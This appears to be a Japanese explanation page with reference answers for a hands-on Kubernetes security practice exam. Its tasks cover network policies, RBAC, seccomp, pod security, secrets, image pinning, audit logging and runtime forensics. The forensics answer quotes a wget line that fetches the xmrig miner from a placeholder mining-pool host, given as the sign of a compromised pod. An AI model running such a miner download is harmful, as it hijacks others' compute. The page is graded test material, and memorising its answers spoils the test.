# 解説

提出後、満点を取れなかった問題についてのみ以下の解説が表示されます。
正解は一つではありません — 採点は「結果が仕様どおりか」を見るので、以下は最短の基準解です。

## Q1 NetworkPolicy — デフォルト拒否と選別的な許可

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: deny-all, namespace: prod }
spec:
  podSelector: {}
  policyTypes: ["Ingress"]
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: allow-frontend, namespace: prod }
spec:
  podSelector: { matchLabels: { app: backend } }
  policyTypes: ["Ingress"]
  ingress:
    - from:
        - podSelector: { matchLabels: { app: frontend } }
      ports:
        - { protocol: TCP, port: 80 }
```

よくある間違い

- `podSelector: {}` は **すべての Pod** を意味します — まるごと省略すると「Pod なし」ではなく **構文エラー** です。
- NetworkPolicy は **加算的** です — deny-all があっても、いずれかの allow ポリシーにマッチしたトラフィックは通過します。
- `from` の下では、`- podSelector` と `- namespaceSelector` を別項目にすると OR、一つの項目に両方書くと AND です。

## Q2 TLS Secret と TLS Ingress

```bash
openssl req -x509 -newkey rsa:2048 -nodes -days 365 \
  -keyout web.key -out web.crt -subj "/CN=web.snacklab.local"
kubectl create secret tls web-cert -n prod --cert=web.crt --key=web.key
```

Ingress では `spec.tls` に `secretName: web-cert` を入れ、ホスト
`web.snacklab.local`、パス `/`（Prefix）→ `web-svc:80` へルーティングします。

よくある間違い

- `kubectl create secret generic` で作るとタイプが `Opaque` になり減点されます。**`create secret tls`** でなければなりません。
- `tls` セクションのない規則だけでは TLS Ingress になりません。

## Q3 プラットフォームバイナリの完全性検証

```bash
cd ~/work/binaries && sha512sum -c checksums.txt
# kubelet: FAILED
echo kubelet > ~/answers/q3.txt
```

配布元が公開したチェックサムと一つでも異なれば、そのバイナリは信頼できません。実際の試験でも
`sha512sum`/`sha256sum -c` の照合がそのまま出ます。

## Q4 RBAC を最小権限に絞り込む

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: { name: ci-role, namespace: apps }
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list"]
  - apiGroups: ["apps"]
    resources: ["deployments"]
    verbs: ["get", "list", "update"]
```

```bash
kubectl -n apps delete rolebinding ci-bot-rb
kubectl -n apps create rolebinding ci-bot-rb --role=ci-role --serviceaccount=apps:ci-bot
```

よくある間違い

- RoleBinding の `roleRef` は **不変** です — ClusterRole/admin から Role/ci-role へ変えるには削除して作り直します。
- `--resource=deployments` だけだと core グループに落ちます。`deployments.apps` です。
- 採点は `auth can-i` の結果です — Secret がまだ読めたり Pod を削除できたりすると減点です。

## Q5 ServiceAccount トークンの自動マウントを止める

```yaml
apiVersion: v1
kind: ServiceAccount
metadata: { name: web-sa, namespace: apps }
automountServiceAccountToken: false
```

```bash
kubectl -n apps patch deploy web -p '{"spec":{"template":{"spec":{"serviceAccountName":"web-sa"}}}}'
```

よくある間違い

- `automountServiceAccountToken` は ServiceAccount の **最上位フィールド** です(metadata でも spec でもありません)。
- SA だけ作って Deployment を指し向けないと、依然として default SA のトークンがマウントされます。
- Pod スペックの `automountServiceAccountToken: false` でも同じ効果が得られます(採点は結果だけを見ます)。

## Q6 危険な ClusterRoleBinding の削除

```bash
kubectl get clusterrolebindings \
  -o custom-columns='NAME:.metadata.name,ROLE:.roleRef.name,SUBJECTS:.subjects[*].name' \
  | grep cluster-admin
echo debug-admin-binding > ~/answers/q6.txt
kubectl delete clusterrolebinding debug-admin-binding
```

よくある間違い

- 既定の `cluster-admin` バインディング(subject `system:masters`)はクラスタ運用に必要です — 削除すると減点です。
- `system:authenticated` に権限を与えるバインディングは「認証さえ通れば誰でも管理者」という意味です。

## Q7 seccomp RuntimeDefault の適用

```bash
kubectl -n sys-hard patch deploy runner -p \
  '{"spec":{"template":{"spec":{"securityContext":{"seccompProfile":{"type":"RuntimeDefault"}}}}}}'
```

よくある間違い

- `seccompProfile` は **securityContext の中** です。Pod レベルに置くと全コンテナに適用されます。
- `type: Localhost` はプロファイルファイルのパス(`localhostProfile`)が必要です。ここでは RuntimeDefault です。

## Q8 ホストアクセスの除去

`kubectl -n sys-hard edit deploy node-tool` で 4 つを削除します:
`securityContext.privileged`、`hostPID`、`hostNetwork`、`hostPath` ボリューム(+その `volumeMounts`)。

よくある間違い

- hostPath ボリュームを削除したのに **volumeMounts を残す** とスペックが不正になり、ロールアウトが止まります。
- Deployment を削除して作り直すより edit/patch のほうが速く安全です。

## Q9 SecurityContext でコンテナを強化

```yaml
containers:
  - name: app
    image: busybox:1.36
    command: ["sh", "-c", "sleep 86400"]
    securityContext:
      runAsNonRoot: true
      runAsUser: 10001
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities: { drop: ["ALL"] }
```

よくある間違い

- `allowPrivilegeEscalation`・`capabilities`・`readOnlyRootFilesystem` は **コンテナレベル専用** です。
- `runAsNonRoot: true` だけで、イメージが root を既定とする場合は `CreateContainerConfigError` になります — `runAsUser` も一緒に与えます。

## Q10 Pod Security Admission — restricted の適用

```bash
kubectl label ns restricted-ns pod-security.kubernetes.io/enforce=restricted
```

続いて Deployment を restricted に適合させます: `privileged` を除去し、
Pod レベルで `runAsNonRoot: true`・`runAsUser`・`seccompProfile: {type: RuntimeDefault}`、
コンテナレベルで `allowPrivilegeEscalation: false`・`capabilities.drop: ["ALL"]`。

よくある間違い

- **ラベルは新しい Pod にしか適用されません。** 既存の privileged Pod は動き続けます — Deployment を直してロールアウトする必要があります。
- ロールアウトが admission に阻まれたら、`kubectl -n restricted-ns describe rs` のイベントに **何が違反かがそのまま書かれています。** それを読むのが最速です。

## Q11 Secret の取り扱い

```bash
kubectl -n apps get secret db-creds -o jsonpath='{.data.password}' | base64 -d > ~/answers/q11.txt
kubectl -n apps create secret generic api-token --from-literal=token=cks-2026
```

Pod は `volumes[].secret.secretName: db-creds` と `volumeMounts`(`mountPath: /etc/creds`、
`readOnly: true`)で使います。

よくある間違い

- `-o jsonpath` の値は **base64 エンコード** されたままです。デコードせずそのまま書くと誤答です。
- `echo` でファイルに書くとき、クォートなしで `S3cr3t-CKS!` を書くとシェルの履歴展開(`!`)に引っかかることがあります — シングルクォートで囲みます。

## Q12 Dockerfile のセキュリティ欠陥を修正

```dockerfile
FROM nginx:1.26
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
COPY index.html /usr/share/nginx/html/index.html
USER nginx
CMD ["nginx", "-g", "daemon off;"]
```

三つ: `latest` → タグ固定、`ENV API_KEY=…` の行を削除(クレデンシャルはイメージレイヤーに永久に残ります)、
`USER root` → 非 root ユーザーに。COPY・CMD はそのまま維持します。

## Q13 脆弱なイメージの特定と隔離

レポートで CRITICAL があるのは `frontend-app`(nginx:1.25、2 件)と `report-app`(httpd:2.4、1 件)です。
`batch-app`(busybox)は LOW のみなので触りません。

```bash
printf 'frontend-app\nreport-app\n' > ~/answers/q13.txt
kubectl -n supply scale deploy frontend-app report-app --replicas=0
```

実際の試験では `trivy image --severity CRITICAL <イメージ>` を直接実行して同じ判断をします。

## Q14 イメージをダイジェストで固定

```bash
kubectl -n supply get pod -l app=pinned \
  -o jsonpath='{.items[0].status.containerStatuses[0].imageID}'
# docker.io/library/nginx@sha256:abcd...
kubectl -n supply set image deploy/pinned web=nginx@sha256:abcd...
```

よくある間違い

- `nginx:1.26@sha256:…` のようにタグを併記してもよいですが、ダイジェストが誤っていると ImagePullBackOff になり、Pod の Ready 採点で引っかかります。
- ダイジェストは任意の文字列ではなく、**実在するイメージのもの** でなければなりません。

## Q15 API サーバーの監査ログ

```yaml
# /var/lib/rancher/k3s/server/audit-policy.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  - level: Metadata
    resources:
      - group: ""
        resources: ["secrets"]
  - level: None
```

```yaml
# /etc/rancher/k3s/config.yaml
kube-apiserver-arg:
  - audit-policy-file=/var/lib/rancher/k3s/server/audit-policy.yaml
  - audit-log-path=/var/lib/rancher/k3s/server/logs/audit.log
  - audit-log-maxage=7
  - audit-log-maxbackup=2
```

```bash
sudo mkdir -p /var/lib/rancher/k3s/server/logs
sudo systemctl restart k3s && kubectl get nodes   # 正常確認は必須
```

よくある間違い

- ポリシーファイルは最初にマッチした規則が採用され、**後ろの規則は評価されません** — `level: None` を先頭に置くと何も残りません。
- `rules` が空だとすべての要求が記録されません。規則の順序: secrets → Metadata を先に、その次に None。
- 再起動後に apiserver が起動しなければ引数のタイプミスです — `sudo journalctl -u k3s | tail` で確認し、config.yaml を直します。

## Q16 ランタイムフォレンジック

```bash
for p in $(kubectl -n runtime get pod -o name); do
  echo "== $p"; kubectl -n runtime exec ${p#pod/} -- ps
done
# logshipper Pod で: wget ... http://pool.minexmr.example/xmrig ...
echo logshipper > ~/answers/q16.txt
kubectl -n runtime scale deploy logshipper --replicas=0
```

よくある間違い

- ワークロード名(`logshipper`)だけ見ると無害に見えます — **プロセス一覧** が根拠です。マイニングプールのドメインや `xmrig` が痕跡です。
- Pod だけ削除しても Deployment が作り直します。**replicas 0** が隔離です。
- 無関係な `web`・`metrics` まで落とすと減点です。隔離は正確でなければなりません。
